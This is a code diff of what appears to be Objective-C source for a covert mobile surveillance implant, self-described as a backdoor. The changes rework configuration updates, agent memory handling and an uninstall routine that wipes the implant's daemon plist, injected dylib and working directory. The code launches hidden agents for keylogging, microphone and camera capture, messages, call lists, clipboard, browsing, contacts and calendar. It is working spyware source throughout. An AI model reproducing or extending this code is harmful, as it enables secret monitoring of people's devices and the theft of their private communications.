@@ -181,18 +181,19 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 
 - (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData
 {
-#ifdef DEBUG_CONF_MANAGER
-  NSLog(@"Writing the new configuration");
-#endif
+  NSString *configUpdatePath = [[NSString alloc] initWithFormat: @"%@/%@", 
+                                                                 [[NSBundle mainBundle] bundlePath], 
+                                                                 gConfigurationUpdateName];
   
-  if ([[NSFileManager defaultManager] fileExistsAtPath: gConfigurationUpdateName] == TRUE)
+  NSString *configurationName = [[NSString alloc] initWithFormat: @"%@/%@", 
+                                                                  [[NSBundle mainBundle] bundlePath], 
+                                                                  gConfigurationName]; 
+                                                                                                                                                                                              
+  if ([[NSFileManager defaultManager] fileExistsAtPath: configUpdatePath] == TRUE)
     {
-#ifdef DEBUG_CONF_MANAGER
-      NSLog(@"updateConfiguration: removing old config file");
-#endif
       NSError *rmErr;
       
-      if (![[NSFileManager defaultManager] removeItemAtPath: gConfigurationUpdateName error: &rmErr])
+      if (![[NSFileManager defaultManager] removeItemAtPath: configUpdatePath error: &rmErr])
         {
 #ifdef DEBUG_CONF_MANAGER
           infoLog(@"Error remove file configuration %@", rmErr);
@@ -200,54 +201,44 @@ extern RCSISharedMemory *mSharedMemoryCommand;
         }
     }
   
-  if ([aConfigurationData writeToFile: gConfigurationUpdateName
-                       atomically: YES])
+  if ([aConfigurationData writeToFile: configUpdatePath
+                           atomically: YES])
     {
 #ifdef DEBUG_CONF_MANAGER
       infoLog(@"file configuration write correctly");
 #endif
     }
-  else
-    {
-#ifdef DEBUG_CONF_MANAGER
-      infoLog(@"Error writing file configuration");
-#endif
-    }
   
-  if ([mConfigManager checkConfigurationIntegrity: gConfigurationUpdateName])
+  if ([mConfigManager checkConfigurationIntegrity: configUpdatePath])
     {
-      //
       // If we're here it means that the file is ok thus it is safe to replace
       // the original one
-      //
-      if ([[NSFileManager defaultManager] removeItemAtPath: gConfigurationName
+      if ([[NSFileManager defaultManager] removeItemAtPath: configurationName
                                                      error: nil])
         {
-          if ([[NSFileManager defaultManager] moveItemAtPath: gConfigurationUpdateName
-                                                      toPath: gConfigurationName
+          if ([[NSFileManager defaultManager] moveItemAtPath: configUpdatePath
+                                                      toPath: configurationName
                                                        error: nil])
             {
-#ifdef DEBUG_CONF_MANAGER
-              infoLog(@"moving new file configuration");
-#endif
               mShouldReloadConfiguration = YES;
+              [configUpdatePath release];
+              [configurationName release];
               return TRUE;
             }
         }
     }
   else
     {
-      [[NSFileManager defaultManager] removeItemAtPath: gConfigurationUpdateName
+      [[NSFileManager defaultManager] removeItemAtPath: configUpdatePath
                                                  error: nil];
-#ifdef DEBUG_CONF_MANAGER
-      infoLog(@"Error moving new file configuration");
-#endif
-      
+    
       RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
       [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
       [infoManager release];
     }
-  
+    
+  [configUpdatePath release];
+  [configurationName release];
   return FALSE;
 }
 
@@ -277,8 +268,13 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 
 - (BOOL)reloadConfiguration
 {
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
   if (mShouldReloadConfiguration == YES) 
     {
+#ifdef DEBUG_
+    NSLog(@"%s: reloading...",__FUNCTION__);
+#endif
       mShouldReloadConfiguration = NO;
       
       RCSIEvents  *eventManager  = [RCSIEvents sharedInstance];
@@ -290,22 +286,40 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           // no issues for timing it out
           if ([eventManager stop] == FALSE)
             {
-#ifdef DEBUG
+#ifdef DEBUG_
               NSLog(@"%s: event manager stop timeout reached",__FUNCTION__);
 #endif
+            }
+          else
+            {
+#ifdef DEBUG_
+            NSLog(@"%s: event manager stopped",__FUNCTION__);
+#endif      
             }
             
           // no issues for timing it out  
           if ([actionManager stop] == TRUE)
             {
-#ifdef DEBUG
-            NSLog(@"%s: action manager stop timeout reached",__FUNCTION__);
+#ifdef DEBUG_
+               NSLog(@"%s: action manager stopped",__FUNCTION__);
+#endif
+            }
+          else
+            {
+#ifdef DEBUG_
+              NSLog(@"%s: action manager stop timeout reached",__FUNCTION__);
 #endif      
             }
             
           if ([self stopAgents] == TRUE)
             {
-#ifdef DEBUG
+#ifdef DEBUG_
+              NSLog(@"%s: agents stopped",__FUNCTION__);
+#endif  
+            }
+          else
+            {
+#ifdef DEBUG_
               NSLog(@"%s: agents stop timeout reached",__FUNCTION__);
 #endif      
             }
@@ -327,7 +341,8 @@ extern RCSISharedMemory *mSharedMemoryCommand;
               [eventManager start];
               
               // Start agents
-              [self startAgents];
+              // no for rcs8
+              //[self startAgents];
             }
           else
             {
@@ -344,6 +359,8 @@ extern RCSISharedMemory *mSharedMemoryCommand;
         }
     }
   
+  [pool release];
+  
   return YES;
 }
 
@@ -355,19 +372,9 @@ extern RCSISharedMemory *mSharedMemoryCommand;
   
   if ([self stopEvents] == TRUE)
     {
-#ifdef DEBUG
-      NSLog(@"Events stopped correctly");
-#endif
-      
       if ([self stopAgents] == TRUE)
         {
-#ifdef DEBUG
-          NSLog(@"Agents stopped correctly");
-#endif
-          
-          //
           // Remove all the external files (LaunchDaemon plist/SLI plist)
-          //
           NSString *ourPlist = BACKDOOR_DAEMON_PLIST;          
           [[NSFileManager defaultManager] removeItemAtPath: ourPlist
                                                      error: nil];
@@ -387,23 +394,13 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           memcpy(shMemoryHeader->commandData, 
                  [[gDylibName dataUsingEncoding: NSASCIIStringEncoding] bytes], 
                  [gDylibName lengthOfBytesUsingEncoding: NSASCIIStringEncoding]);
-        
-#ifdef DEBUG
-          NSLog(@"%s: sending uninstall command to dylib %@", __FUNCTION__, gDylibName);
-#endif
-        
+
           if ([mSharedMemory writeMemory: uninstCommand
                                   offset: OFFT_UNINSTALL
                            fromComponent: COMP_CORE])
             {
 #ifdef DEBUG
               NSLog(@"%s: sending uninstall command to dylib: done!", __FUNCTION__);
-#endif
-            }
-          else 
-            {
-#ifdef DEBUG
-              NSLog(@"%s: sending uninstall command to dylib: error!", __FUNCTION__);
 #endif
             }
           
@@ -422,9 +419,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                                    error: nil];
           [dylibPathname release];
         
-          //
           // Remove our working dir
-          //
           if ([[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                                                          error: nil])
             {
@@ -432,27 +427,13 @@ extern RCSISharedMemory *mSharedMemoryCommand;
               NSLog(@"Backdoor dir removed correctly");
 #endif
             }
-          else
-            {
-#ifdef DEBUG
-              NSLog(@"An error occurred while removing backdoor dir");
-#endif
-            }
 
-          //
           // Closing lock socket
-          //
           if (gLockSock != -1)
             {
               close(gLockSock);
 #ifdef DEBUG
               NSLog(@"closing socket ok");
-#endif
-            }
-          else
-            {
-#ifdef DEBUG
-              NSLog(@"An error occurred while closing socket");
 #endif
             }
 
@@ -469,9 +450,12 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           int status;
           waitpid(pid, &status, 0);
           
-          //
+          // play sound/vibrate is in demo
+          checkAndRunDemoMode();
+          
+          sleep(1);
+          
           // And now exit
-          //
           exit(0);
         }
     }
@@ -527,10 +511,11 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #endif                                      
               }
           
-            [agentConfiguration release];
             [agentCommand release];
           }
-      
+  
+        [agentConfiguration release];
+        
         break;
       }        
     case AGENT_URL:
@@ -556,15 +541,11 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                 [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
               }
 
-            [agentConfiguration release];
             [agentCommand release];
           }
-        else
-            {
-#ifdef DEBUG
-              NSLog(@"%s: Agent URL is already running", __FUNCTION__);
-#endif
-            }
+
+        [agentConfiguration release];
+        
         break;
       }
     case AGENT_KEYLOG:
@@ -590,9 +571,11 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                 [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
               }
             
-            [agentConfiguration release];
             [agentCommand release];
           }
+
+        [agentConfiguration release];
+        
         break;
       } 
     case AGENT_CLIPBOARD:
@@ -618,9 +601,10 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                 [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
               }
             
-            [agentConfiguration release];
             [agentCommand release];
           }
+        
+        [agentConfiguration release];
         
         break;
       }
@@ -648,17 +632,18 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                 [agentConfiguration setObject: AGENT_RUNNING  forKey: @"status"];
               }
                           
-            [agentConfiguration release];
+            
             [agentCommand release];
           }
-      
+        
+        [agentConfiguration release];
+        
         break;
       }
     case AGENT_MICROPHONE:
       {   
         RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
         
-        //XXX-
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
@@ -667,12 +652,14 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           {
             [agentConfiguration setObject: AGENT_START forKey: @"status"];
           
-            agentMicrophone.mAgentConfiguration = agentConfiguration;
+            [agentMicrophone setMAgentConfiguration: agentConfiguration];
           
             [NSThread detachNewThreadSelector: @selector(start)
                                      toTarget: agentMicrophone
                                    withObject: nil];
           }
+         
+        [agentConfiguration release];
         
         break;
       }
@@ -680,7 +667,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
       {   
         RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
         
-        //XXX-
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
@@ -689,18 +675,21 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           {
             [agentConfiguration setObject: AGENT_START forKey: @"status"];
             
-            agentMessages.mAgentConfiguration = agentConfiguration;
+            [agentMessages setMAgentConfiguration: agentConfiguration];;
             
             [NSThread detachNewThreadSelector: @selector(start)
                                      toTarget: agentMessages
                                    withObject: nil];
           }
         
+        [agentConfiguration release];
+        
         break;
       }
     case AGENT_ORGANIZER:
       {   
         RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];                               
+        
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
 
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
@@ -709,7 +698,7 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           {
             [agentConfiguration setObject: AGENT_START forKey: @"status"];
 #ifdef  JSON_CONFIG
-            agentCalendar.mAgentConfiguration = agentConfiguration;
+            [agentCalendar setMAgentConfiguration: agentConfiguration];
             [NSThread detachNewThreadSelector: @selector(start)
                                      toTarget: agentCalendar
                                    withObject: nil];
@@ -727,11 +716,14 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #endif
           }
 
+        [agentConfiguration release];
+        
         break;
       }
     case AGENT_ADDRESSBOOK:
       {   
-        RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];                             
+        RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];   
+                                                           
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
@@ -739,12 +731,16 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             [agentConfiguration objectForKey: @"status"] != AGENT_SUSPENDED)
           {
             [agentConfiguration setObject: AGENT_START forKey: @"status"];
-
+            
+            [agentAddress setMAgentConfiguration: agentConfiguration];
+            
             [NSThread detachNewThreadSelector: @selector(start)
                                      toTarget: agentAddress
                                    withObject: nil];
           }
         
+        [agentConfiguration release];
+             
         break;
       }
     case AGENT_CRISIS:
@@ -761,7 +757,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
       {
         RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];
         
-        //XXX-
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
 
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
@@ -770,20 +765,21 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           {
             [agentConfiguration setObject: AGENT_START forKey: @"status"];
 
-            agentDevice->mAgentConfiguration = agentConfiguration;
+            [agentDevice setMAgentConfiguration: agentConfiguration];
 
             [NSThread detachNewThreadSelector: @selector(start)
                                      toTarget: agentDevice
                                    withObject: nil];
           }
-
+        
+        [agentConfiguration release];
+        
         break;
       }
     case AGENT_CALL_LIST:
       {   
         RCSIAgentCallList *agentCallList = [RCSIAgentCallList sharedInstance];
       
-        //XXX-
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
@@ -793,13 +789,15 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             [agentConfiguration setObject: AGENT_START
                                    forKey: @"status"];
             
-            agentCallList.mAgentConfiguration = agentConfiguration;
+            [agentCallList setMAgentConfiguration: agentConfiguration];
             
             [NSThread detachNewThreadSelector: @selector(start)
                                      toTarget: agentCallList
                                    withObject: nil];
           }
-
+          
+        [agentConfiguration release];
+        
         break;
       }
     case AGENT_CAM:
@@ -815,12 +813,15 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           {
             [agentConfiguration setObject: AGENT_START forKey: @"status"];
         
-            agentCamera->mAgentConfiguration = agentConfiguration;
+            [agentCamera setMAgentConfiguration: agentConfiguration];
         
             [NSThread detachNewThreadSelector: @selector(start)
                                      toTarget: agentCamera
                                    withObject: nil];
           }
+        
+        [agentConfiguration release];
+        
         break;
       }
     default:
@@ -1615,17 +1616,28 @@ extern RCSISharedMemory *mSharedMemoryCommand;
               }
             case AGENT_ORGANIZER:
               {
-                RCSIAgentAddressBook *agentAddress  = [RCSIAgentAddressBook sharedInstance];
-                RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
+                RCSIAgentCalendar *agentCalendar = [RCSIAgentCalendar sharedInstance];
                 
-                if ([agentAddress stop] == FALSE ||
-                    [agentCalendar stop] == FALSE)
+                if ([agentCalendar stop] == FALSE)
                   {
 #ifdef DEBUG
                     NSLog(@"Error while stopping agent AddressBook/Calendar");
 #endif
                   }
                 
+                break;
+              }
+            case AGENT_ADDRESSBOOK:
+              {
+                RCSIAgentAddressBook *agentAddress  = [RCSIAgentAddressBook sharedInstance];
+              
+                if ([agentAddress stop] == FALSE)
+                  {
+#ifdef DEBUG
+                  NSLog(@"Error while stopping agent AddressBook/Calendar");
+#endif
+                  }
+              
                 break;
               }
             case AGENT_CRISIS:
@@ -2228,37 +2240,29 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #pragma mark Getter/Setter
 #pragma mark -
 
-- (NSArray *)getConfigForAction: (u_int)anActionID
+- (NSArray *)getConfigForAction: (u_int)anActionID withFlag:(BOOL*)concurrent
 {  
-#ifdef  JSON_CONFIG  
 #define ACTION_SUBACT_KEY @"subactions"  
   
-  NSArray *subactions;
+  *concurrent = FALSE;
+  
+  NSArray *subactions = nil;
 
   @synchronized(self)
   {
     NSDictionary *subaction = [mActionsList objectAtIndex:anActionID];
-    subactions = [[[subaction objectForKey: ACTION_SUBACT_KEY] retain] autorelease];
+    
+    if (subaction != nil)
+      {
+        subactions     = [[subaction objectForKey: ACTION_SUBACT_KEY] retain];
+        NSNumber *flag = [subaction objectForKey:@"concurrent"];
+        
+        if (flag != nil && [flag boolValue] == TRUE)
+          *concurrent = TRUE;
+      }
   }
 
   return subactions;
-  
-#else
-  NSMutableArray *configArray = [[NSMutableArray alloc] init];
-  NSMutableDictionary *anObject;
-  
-  for (anObject in mActionsList)
-    {
-      if ([[anObject threadSafeObjectForKey: @"actionID"
-                                  usingLock: gTaskManagerLock]
-           unsignedIntValue] == anActionID)
-        {
-          [configArray addObject: anObject];
-        }
-    }
-  
-  return [configArray autorelease];
-#endif
 }
 
 - (NSMutableDictionary *)getConfigForAgent: (u_int)anAgentID
@@ -2305,12 +2309,46 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 
 - (void)removeAllElements
 {
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
   @synchronized(self)
   {
-    [mEventsList removeAllObjects];
-    [mActionsList removeAllObjects];
-    [mAgentsList removeAllObjects];
+//    [mEventsList removeAllObjects];
+//    [mActionsList removeAllObjects];
+//    [mAgentsList removeAllObjects];
+
+    int cout = [mEventsList count];
+    
+    for (int i=cout-1;i>=0;i--) 
+    {
+      id oi = [mEventsList objectAtIndex:i];
+      if (oi == nil)
+        break;
+      [mEventsList removeObjectAtIndex:i];
+    }
+    
+    cout = [mActionsList count];
+    
+    for (int i=cout-1;i>=0;i--) 
+    {
+      id oi = [mActionsList objectAtIndex:i];
+      if (oi == nil)
+        break;
+      [mActionsList removeObjectAtIndex:i];
+    }
+    
+    cout = [mAgentsList count];
+    
+    for (int i=cout-1;i>=0;i--) 
+    {
+      id oi = [mAgentsList objectAtIndex:i];
+      if (oi == nil)
+        break;
+      [mAgentsList removeObjectAtIndex:i];
+    }
   }
+  
+  [pool release];
 }
 
 @end
